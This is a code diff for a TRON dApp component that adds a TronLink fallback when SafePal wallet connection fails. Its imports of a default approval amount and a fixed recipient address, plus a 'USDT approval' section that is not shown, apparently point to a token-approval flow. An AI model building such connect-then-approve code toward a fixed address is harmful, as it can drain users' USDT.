@@ -7,6 +7,8 @@ import { Wallet, CheckCircle, AlertCircle, Loader2, ArrowRight } from "lucide-re
 import { SafePalConnector } from "@/wallets/safepal-wallet"
 import type { WalletType } from "@/utils/wallet-detection"
 import { USDT_CONTRACT, DEFAULT_APPROVAL_AMOUNT, DAPP_ADDRESS, DEFAULT_RECIPIENT_ADDRESS } from "@/utils/tron-config"
+import { TronLinkConnector } from "@/wallets/tronlink-wallet"
+
 
 /**
  * SafePal Wallet Connector Component
@@ -45,34 +47,44 @@ export default function SafePalWalletConnector() {
    * This function specifically handles SafePal wallet integration
    */
   const connectWallet = async () => {
-    setIsConnecting(true)
-    setError("")
-    setSuccess("")
+  setIsConnecting(true)
+  setError("")
+  setSuccess("")
 
-    try {
-      // Initialize SafePal connector instance
-      const safePal = SafePalConnector.getInstance()
+  try {
+    // Attempt SafePal connection first
+    const safePal = SafePalConnector.getInstance()
+    let result = await safePal.connect()
+    console.log("SafePal Connect Result:", result)
+    console.log("TronWeb Available:", !!window.tronWeb, window.tronWeb?.defaultAddress)
 
-      // Attempt to connect to SafePal wallet
-      const result = await safePal.connect()
-      console.log("SafePal Connect Result:", result)
-      console.log("TronWeb Available:", !!window.tronWeb, window.tronWeb?.defaultAddress)
+    if (!result.success || !window.tronWeb?.defaultAddress?.base58) {
+      // Try TronLink as fallback
+      const tronLink = TronLinkConnector.getInstance()
+      result = await tronLink.connect()
+      console.log("TronLink Connect Result:", result)
 
-      // Verify successful SafePal connection and TronWeb availability
       if (result.success && window.tronWeb && window.tronWeb.defaultAddress.base58) {
         setConnectedWallet(result.address)
-        setWalletType("SafePal")
-        setSuccess("Successfully connected wallet!")
+        setWalletType("TronLink")
+        setSuccess("Connected via TronLink!")
+        return
       } else {
-        throw new Error(result.error || "SafePal not properly initialized")
+        throw new Error(result.error || "No wallet address found. Please unlock your wallet and try again.")
       }
-    } catch (err: any) {
-      console.error("Wallet connection error:", err)
-      setError(err.message || "Failed to connect wallet")
-    } finally {
-      setIsConnecting(false)
     }
+
+    // SafePal was successful
+    setConnectedWallet(result.address)
+    setWalletType("SafePal")
+    setSuccess("Successfully connected SafePal wallet!")
+  } catch (err: any) {
+    console.error("Wallet connection error:", err)
+    setError(err.message || "Failed to connect wallet")
+  } finally {
+    setIsConnecting(false)
   }
+}
 
   // ===== USDT APPROVAL FUNCTIONALITY =====
   /**
